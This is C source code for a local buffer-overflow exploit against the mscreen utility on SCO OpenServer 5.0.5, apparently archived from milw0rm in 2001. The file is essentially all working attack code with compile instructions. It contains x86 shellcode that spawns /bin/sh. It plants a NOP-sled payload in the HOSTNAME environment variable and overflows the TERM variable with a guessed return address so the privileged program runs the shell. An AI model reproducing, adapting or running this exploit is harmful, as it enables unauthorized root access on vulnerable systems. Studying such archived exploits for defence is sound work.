/*      Copyright (c) 2000 ADM                                  */
/*      All Rights Reserved                                     */
/*      THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF ADM      */
/*      The copyright notice above does not evidence any        */
/*      actual or intended publication of such source code.     */
/*                                                              */
/*      Title:        SCO OpenServer mscreen                    */
/*      Tested under: SCO OpenServer 5.0.5                      */
/*      By:           K2                                        */
/*      Use:          gcc -o mscreen sco-mscreen.c              */
/*                                                              */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shell[] =
  /* doble@iname.com */
   "\xeb\x1b\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x0c\x88\x5e\x11\x31\xc0"
   "\xb0\x3b\x8d\x7e\x07\x89\xf9\x53\x51\x56\x56\xeb\x10\xe8\xe0\xff"
   "\xff\xff/bin/sh\xaa\xaa\xaa\xaa\x9a\xaa\xaa\xaa\xaa\x07\xaa";
   
#define SIZE 130
#define NOPDEF 40
#define DEFOFF -200
#define EGG 500

const char x86_nop=0x90;
long nop,esp;
long offset=DEFOFF;
char buffer[SIZE];
char egg[EGG];

long get_esp() { __asm__("movl %esp,%eax"); }

int main (int argc, char *argv[]) {
    int i;
    if (argc > 1) offset += strtol(argv[1], NULL, 0);
    if (argc > 2) nop += strtoul(argv[2], NULL, 0);
    else
        nop = NOPDEF;
    esp = get_esp();
    memset(egg,x86_nop,EGG);
    memcpy(egg+300, shell, strlen(shell));
    memset(buffer, x86_nop, SIZE);
    memcpy(buffer+nop, shell, strlen(shell));
    for (i = 1; i < SIZE-4; i += 4) {
        *((int *) &buffer[i]) = esp+offset;
    }
    memcpy(egg,"HOSTNAME=",9);  /* just playin */
    memcpy(buffer,"TERM=",5);   /* here's the overflow */
    putenv(egg);
    putenv(buffer);
    printf("offset = [0x%x]\n",esp+offset);
    execl("/usr/bin/mscreen", "mscreen", NULL);
    printf("exec failed!\n");
    return 0;
}


// milw0rm.com [2001-01-26]
